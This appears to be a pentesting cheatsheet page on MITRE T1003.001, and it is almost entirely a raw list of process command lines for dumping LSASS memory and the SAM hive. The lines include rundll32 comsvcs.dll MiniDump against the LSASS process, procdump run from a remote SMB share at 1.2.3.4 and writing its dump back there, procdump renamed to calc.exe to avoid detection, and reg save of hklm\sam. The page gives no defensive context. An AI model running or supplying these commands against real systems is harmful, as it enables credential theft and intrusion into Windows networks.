---
layout: post
title: T1003.001 LSASS dump methods 
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
has_children: true
modified_date: 2021-07-28
---

Mitre Attack [T1003.001](https://attack.mitre.org/techniques/T1003/001/)

```
# EXEC STEP 1
['"PowerShell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\test\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']
['"C:\WINDOWS\system32\cmd.exe" ']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ']
['C:\WINDOWS\system32\DllHost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['explorer.exe']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['launchtm.exe /2']
['"C:\WINDOWS\system32\taskmgr.exe" /4']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']

# EXEC STEP 2
['"PowerShell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\test\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']
['"cmd.exe" ']
['cmd.exe']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'C:\\'']
['"cmd.exe" ']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ']
['C:\WINDOWS\system32\DllHost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['rundll32.exe  C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['explorer.exe']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['"C:\WINDOWS\System32\Taskmgr.exe" /2']
['"C:\WINDOWS\system32\taskmgr.exe" /4']
['"powershell.exe" ']
['"cmd.exe" ']
['"powershell.exe" ']
['"powershell.exe" ']
['"cmd.exe" ']
['"powershell.exe" ']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']
['"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noexit -command Set-Location -literalPath \'\\1.2.3.4\E_salesbuget\'']

# EXEC STEP 3
['"\\1.2.3.4\test\procdump.exe" -accepteula -ma lsass \\1.2.3.4\test']
['"\\1.2.3.4\E_salesbuget\procdump64.exe" --accepteula -ma lsass.exe tmp.txt']
['reg.exe  save hklm\sam c:\temp\sam.save']
['reg.exe  save hklm\sam c:\temp\sam.save']
['"C:\WINDOWS\system32\reg.exe" save hklm\sam c:\temp\sam.save']
['reg.exe  save hklm\sam c:\temp\sam.save']
['"C:\WINDOWS\system32\reg.exe" save hklm\sam c:\temp\sam.save']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['rundll32.exe  C:\Windows\System32\comsvcs.dll MiniDump 984 calc.tmp full']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['rundll32.exe  C:\Windows\System32\comsvcs.dll MiniDump 984 calc.tmp full']
['"C:\WINDOWS\system32\rundll32.exe" C:\Windows\System32\comsvcs.dll MiniDump 984 lsass.dmp full']
['"\\1.2.3.4\E_salesbuget\calc.exe" --accepteula -ma lsass.exe tmp.txt']
['"\\1.2.3.4\E_salesbuget\procdump64.exe" --accepteula -ma lsass.exe tmp.txt']
```
Reference: [Docs Microsoft - configuring SMB](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3)
